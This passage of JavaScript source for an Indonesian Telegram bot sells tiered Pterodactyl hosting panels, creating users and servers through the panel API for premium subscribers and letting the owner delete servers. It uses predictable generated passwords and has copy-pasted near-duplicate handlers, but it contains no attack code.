┏━━━━━━━⬣
│ RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 5gb
bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /5gb namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "5gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "5048";
  const cpu = "140";
  const disk = "5048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delsrv (.+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const srv = match[1].trim();

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
  }

  if (!srv) {
    bot.sendMessage(
      chatId,
      "Mohon masukkan ID server yang ingin dihapus, contoh: /delsrv 1234"
    );
    return;
  }

  try {
    let f = await fetch(domain + "/api/application/servers/" + srv, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    let res = f.ok ? { errors: null } : await f.json();

    if (res.errors) {
      bot.sendMessage(chatId, "SERVER TIDAK ADA");
    } else {
      bot.sendMessage(chatId, "SUCCESFULLY DELETE SERVER");
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghapus server.");
  }
});

bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /6gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "6gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "6048";
  const cpu = "170";
  const disk = "6048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 7gb
bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /7gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "7gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "7048";
  const cpu = "200";
  const disk = "7048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 8gb
bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
  
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /8gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "8gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "8048";
  const cpu = "230";
  const disk = "8048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 9gb
bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /9gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "9gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "9048";
  const cpu = "260";
  const disk = "9048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 10gb
bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "10gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "10000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}
 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
bot.onText(/\/11gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  
  const u = t[1];
  const name = username + "10gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "11000";
  const cpu = "290";
  const disk = "10000";
  const spc =
